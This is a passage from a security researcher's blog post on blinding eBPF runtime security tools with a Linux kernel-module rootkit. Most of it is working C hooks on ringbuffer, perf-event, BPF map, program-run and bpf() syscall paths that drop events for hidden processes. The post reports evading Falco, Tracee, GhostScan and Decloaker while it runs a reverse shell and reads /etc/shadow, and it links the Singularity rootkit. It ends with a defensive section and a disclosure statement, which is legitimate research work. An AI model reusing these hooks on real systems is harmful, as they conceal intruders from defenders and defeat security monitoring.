</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nl">passthrough</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nf">orig_bpf_ringbuf_submit</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>How This Defeats Detection:</strong></p>
<p>Falco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco&rsquo;s perspective, these processes simply don&rsquo;t exist.</p>
<h2 id="blocking-perf-event-submission">Blocking Perf Event Submission<a hidden class="anchor" aria-hidden="true" href="#blocking-perf-event-submission">#</a></h2>
<p>Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.</p>
<p><strong>Hooking perf_event_output:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">int</span> <span class="nf">hook_perf_event_output</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">event</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                                          <span class="k">struct</span> <span class="n">perf_sample_data</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                          <span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_perf_event_output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">ENOSYS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Drop perf events for hidden processes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_perf_event_output</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">regs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Hooking perf_trace_run_bpf_submit:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">void</span> <span class="nf">hook_perf_trace_run_bpf_submit</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">raw_data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                                    <span class="kt">int</span> <span class="n">rctx</span><span class="p">,</span> <span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                                    <span class="k">struct</span> <span class="n">hlist_head</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                                    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_perf_trace_run_bpf_submit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if the task is hidden
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">task</span> <span class="o">&amp;&amp;</span> <span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Also check current process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">orig_perf_trace_run_bpf_submit</span><span class="p">(</span><span class="n">raw_data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">rctx</span><span class="p">,</span> <span class="n">regs</span><span class="p">,</span> <span class="n">head</span><span class="p">,</span> <span class="n">task</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="manipulating-bpf-maps">Manipulating BPF Maps<a hidden class="anchor" aria-hidden="true" href="#manipulating-bpf-maps">#</a></h2>
<p>Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.</p>
<p><strong>Hooking bpf_map_lookup_elem:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">hook_bpf_map_lookup_elem</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf_map_lookup_elem</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">orig_bpf_map_lookup_elem</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// If the map uses PIDs as keys, filter hidden PIDs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&amp;&amp;</span> <span class="n">map</span> <span class="o">&amp;&amp;</span> <span class="n">map</span><span class="o">-&gt;</span><span class="n">key_size</span> <span class="o">==</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">pid_t</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pid</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">pid_t</span> <span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>  <span class="c1">// Pretend the entry doesn&#39;t exist
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Hooking bpf_map_update_elem:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">long</span> <span class="nf">hook_bpf_map_update_elem</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                               <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="n">u64</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">u32</span> <span class="o">*</span><span class="n">pid_key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf_map_update_elem</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">ENOSYS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// If this is a PID-keyed map, block updates for hidden PIDs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">&amp;&amp;</span> <span class="n">map</span><span class="o">-&gt;</span><span class="n">key_size</span> <span class="o">==</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pid_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span> <span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">pid_key</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// Silently succeed without actually updating
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_bpf_map_update_elem</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>How This Defeats Detection:</strong></p>
<p>Security tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool&rsquo;s logic continues to work, but it operates on an incomplete view of reality.</p>
<h2 id="blocking-ebpf-program-execution">Blocking eBPF Program Execution<a hidden class="anchor" aria-hidden="true" href="#blocking-ebpf-program-execution">#</a></h2>
<p>For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.</p>
<p><strong>Hooking __bpf_prog_run:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="n">u32</span> <span class="nf">hook_bpf_prog_run</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="n">prog</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf_prog_run</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Don&#39;t execute eBPF programs for hidden processes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_bpf_prog_run</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Hooking the bpf() syscall:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="n">asmlinkage</span> <span class="kt">long</span> <span class="nf">hook_bpf</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">ENOSYS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">di</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Hidden processes can use bpf() normally
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// but we could log/block specific commands here
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Optional: block certain BPF commands
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_bpf</span><span class="p">(</span><span class="n">regs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h1 id="real-world-bypass-results">Real-World Bypass Results<a hidden class="anchor" aria-hidden="true" href="#real-world-bypass-results">#</a></h1>
<blockquote>
<p><strong>Proof-of-Concept video demonstrating these results:</strong><br>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/ByEp137w3Ks?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
    </div>
</p></blockquote>
<h2 id="falco-evasion">Falco Evasion<a hidden class="anchor" aria-hidden="true" href="#falco-evasion">#</a></h2>
<p>Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.</p>
<p><strong>What Falco Should Detect:</strong></p>
<ul>
<li>Reverse shell creation</li>
<li>Suspicious network connections</li>
<li>Critical file read</li>
</ul>
<p>And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).</p>
<p><strong>Bypass Results:</strong></p>
<p>With our BPF hooks active:</p>
<ol>
<li><strong>Reverse Shell</strong>: Connected to attacker-controlled server on port 8081. Falco detected nothing.</li>
<li><strong>Process Execution</strong>: Spawned interactive bash shell. Falco detected nothing.</li>
<li><strong>File Modification</strong>: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing.</li>
<li><strong>Network Activity</strong>: Established multiple TCP connections. Falco detected nothing.</li>
<li><strong>Privilege Escalation</strong>: Used rootkit&rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing.</li>
</ol>
<p><strong>Why The Bypass Works:</strong></p>
<p>Falco&rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco&rsquo;s userspace agent. From Falco&rsquo;s perspective, the system appears normal.</p>
<h2 id="tracee-evasion">Tracee Evasion<a hidden class="anchor" aria-hidden="true" href="#tracee-evasion">#</a></h2>
<p>Tracee provides detailed system call tracing and event analysis. It&rsquo;s designed to detect anomalous behavior and hidden processes.</p>
<p><strong>What Tracee Should Detect:</strong></p>
<ul>
<li>Hidden processes</li>
<li>Kernel module loading</li>
<li>Syscall anomalies</li>
</ul>
<p>And common attacker workflows (process hiding and suspicious network behavior).</p>
<p><strong>Bypass Results:</strong></p>
<p>With our BPF hooks active:</p>
<ol>
<li><strong>Process Enumeration</strong>: Tracee&rsquo;s process listing showed no hidden processes</li>
<li><strong>Syscall Tracing</strong>: No syscalls from hidden processes appeared in traces</li>
<li><strong>Network Connections</strong>: Hidden network connections invisible to Tracee</li>
</ol>
<p><strong>Why The Bypass Works:</strong></p>
<p>Tracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.</p>
<h2 id="additional-tools">Additional Tools<a hidden class="anchor" aria-hidden="true" href="#additional-tools">#</a></h2>
<p><strong>GhostScan:</strong></p>
<p>GhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.</p>
<p>Result: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.</p>
<p><strong>Decloaker:</strong></p>
<p>Decloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.</p>
<p>Result: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.</p>
<p><strong>Custom eBPF Tools:</strong></p>
<p>Several custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.</p>
<p><strong>The Hard Truth:</strong></p>
<p>If an attacker gains the ability to load kernel modules, they control the kernel&rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.</p>
<h1 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h1>
<p>This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.</p>
<p><strong>My Findings:</strong></p>
<ol>
<li>
<p><strong>Target the data path, not the program</strong>: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can &ldquo;run correctly&rdquo; while its output never arrives.</p>
</li>
<li>
<p><strong>Enumerators are just another surface</strong>: Iterator-based tools depend on <code>bpf_iter_run_prog()</code> and <code>seq_file</code> writes. Filtering there can make multiple views of the system agree on a lie.</p>
</li>
<li>
<p><strong>Event delivery is a choke point</strong>: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.</p>
</li>
<li>
<p><strong>State can be selectively erased</strong>: Map lookups/updates are convenient places to make hidden PIDs appear &ldquo;not found&rdquo; without breaking the rest of the system.</p>
</li>
<li>
<p><strong>Once the kernel is hostile, observability is best-effort</strong>: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.</p>
</li>
</ol>
<p><strong>What this PoC demonstrates:</strong></p>
<ul>
<li>Successfully bypassed Falco, Tracee, GhostScan, and Decloaker</li>
<li>Demonstrated complete process and network hiding from eBPF tools</li>
<li>Proved that kernel-level access fundamentally breaks the security model</li>
<li>Showed that observability itself can be made optional for an attacker</li>
</ul>
<p><strong>Defensive Implications:</strong></p>
<p>Security cannot rely solely on kernel-level observability. Defense-in-depth requires:</p>
<ul>
<li>Preventing kernel compromise through Secure Boot and signed modules</li>
<li>Multi-layer monitoring including network-level detection</li>
<li>Hardware-rooted trust and attestation</li>
<li>Accepting that a compromised kernel cannot secure itself</li>
</ul>
<p><strong>The Future:</strong></p>
<p>This cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)</p>
<p>Bottom line: once the kernel is attacker-controlled, the system&rsquo;s &ldquo;ground truth&rdquo; is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can&rsquo;t be the last line of defense against a hostile one.</p>
<p>The real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).</p>
<hr>
<p><strong>Research Resources:</strong></p>
<ul>
<li>Singularity Rootkit: <a href="https://github.com/MatheuZSecurity/Singularity">https://github.com/MatheuZSecurity/Singularity</a></li>
<li>Rootkit Research Community: <a href="https://discord.gg/66N5ZQppU7">https://discord.gg/66N5ZQppU7</a></li>
<li>Contact: X (@MatheuzSecurity) | Discord (kprobe)</li>
</ul>
<p><strong>Responsible Disclosure:</strong></p>
<p>This research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.</p>
<p>If you&rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/ebpf/">EBPF</a></li>
      <li><a href="http://localhost:1313/tags/kernel-security/">Kernel Security</a></li>
      <li><a href="http://localhost:1313/tags/evasion/">Evasion</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/">
    <span class="title">« Prev</span>
    <br>
    <span>A simple way to detect and remove LKM rootkit KoviD (Outdated)</span>
  </a>
  <a class="next" href="http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/">
    <span class="title">Next »</span>
    <br>
    <span>breaking ld_preload rootkit hooks</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2026 <a href="http://localhost:1313/">0xMatheuZ</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
